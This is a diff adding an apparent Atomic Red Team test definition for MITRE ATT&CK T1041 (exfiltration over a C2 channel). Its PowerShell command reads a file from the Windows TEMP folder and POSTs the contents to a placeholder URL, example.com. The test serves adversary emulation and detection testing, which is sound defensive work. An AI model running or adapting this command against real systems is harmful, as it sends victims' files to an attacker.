@@ -1,0 +1,27 @@
+attack_technique: T1041
+display_name: 'Exfiltration Over C2 Channel'
+atomic_tests:
+- name: C2 Data Exfiltration
+  auto_generated_guid: d1253f6e-c29b-49dc-b466-2147a6191932
+  description: |
+    Exfiltrates a file present on the victim machine to the C2 server.
+  supported_platforms:
+  - windows
+  input_arguments:
+    destination_url:
+      description: Destination URL to post encoded data.
+      type: String
+      default: example.com
+    filepath:
+      description: The file which is being exfiltrated to the C2 Server.
+      type: Path
+      default: $env:TEMP\LineNumbers.txt
+  executor:
+    command: |
+     if(-not (Test-Path #{filepath})){ 
+       1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
+     }
+     [System.Net.ServicePointManager]::Expect100Continue = $false
+     $filecontent = Get-Content -Path #{filepath}
+     Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
+    name: powershell
